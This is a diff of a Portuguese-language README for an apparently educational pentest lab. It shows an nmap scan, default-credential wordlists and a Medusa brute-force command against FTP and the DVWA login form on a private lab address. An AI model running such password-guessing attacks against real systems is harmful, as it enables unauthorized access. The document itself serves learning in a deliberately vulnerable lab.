@@ -13,7 +13,7 @@ O objetivo deste projeto foi compreender as técnicas ofensivas e refletir sobre
 
 <br>
 
-## 2 - 📝 Verificações iniciais:
+## 2 - 📝 Verificações Iniciais:
 - Verificação de ping entre os dois SOs; <br>
       └── Verifica se ambos estão se comunicando.
 
@@ -31,18 +31,49 @@ O objetivo deste projeto foi compreender as técnicas ofensivas e refletir sobre
       
 <br>
 
-## 🕵️‍♂️ Cenários de Ataques:
- **1º Etapa: Escanear possiveis portas abertas e o tipo de serviço:**
+## 🚪 Cenários de Ataques FTP:
+ **Etapa 1: Escanear possiveis portas abertas e o tipo de serviço:**
    ```bash
    nmap -sV -p 21,22,80,445,139 coloque o IP
    ```
-* **Resultado da análise:** Porta 21 (FTP) aberta, rodando o serviço `ProFTPD`.
+* **Resultado da análise:** Acesso bem sucedido no `FTP` ✔
+  <img width="1029" height="553" alt="image" src="https://github.com/user-attachments/assets/a6544b03-ac68-4690-962d-9654814ada3a" />
 
 <br>
 
+ **Etapa 2: Quebrando senhas com a ferramenta Medusa: Faça a criação de arquivos com possíveis nomes de usuários e senhas:**
+ ```bash
+echo -e "user\nmsfadmin\nadmin\nroot" > users.txt
+```
+
+```bash
+echo -e "123456\npassword\nqwerty\nmsfadmin" > pass.txt
+```
+* **Resultado da exploração:** Usuário e Login encontrados com sucesso! Podemos entrar acessar a conexão FTP com privilégios ✔
+ <img width="1179" height="555" alt="image" src="https://github.com/user-attachments/assets/5a336aa4-5ce3-4112-b86f-c1d37de474d4" />
+
+## 📑 Cenários de Ataques em Formulários de Login:
+**Etapa 3: Entrar no site: DVWA**
+```bash
+192.168.56.102/dvwa/login.php
+```
+**3.1 - Criar wordlists para usuários e senhas;**
+**3.2 - Rodar o seguinte comando:**
+```bash
+medusa -h 192.168.56.102 -U users.txt -P pass.txt -M http \
+-m PAGE: '/dvwa/login.php' \
+-m FORM: 'username=^USER^&password=^PASS^&Login=Login' \
+-m 'FAIL=Login failed' -t 6
+```
+<img width="1251" height="607" alt="image" src="https://github.com/user-attachments/assets/2068f786-ab68-4490-82f5-79932d1fc090" />
+
+- **Resumo do comando: O comando faz brute force no login do DVWA via HTTP, usando listas de usuários e senhas, enviando requisições do tipo POST, identificando falhas pelo texto “Login failed” e executando tudo em 6 tentativas acontecendo ao mesmo tempo.**
+
+## 💻 Cenários de Ataques SMB:
+
 ![](https://i.imgur.com/WTLoFrq.png)
 
-## 🔗 Compartilhe com a comunidade ❤
+## 🔗 Compartilhe com a comunidade 🧡
 
 Por favor, se esse conteúdo te ajudou, compartilhe.
 
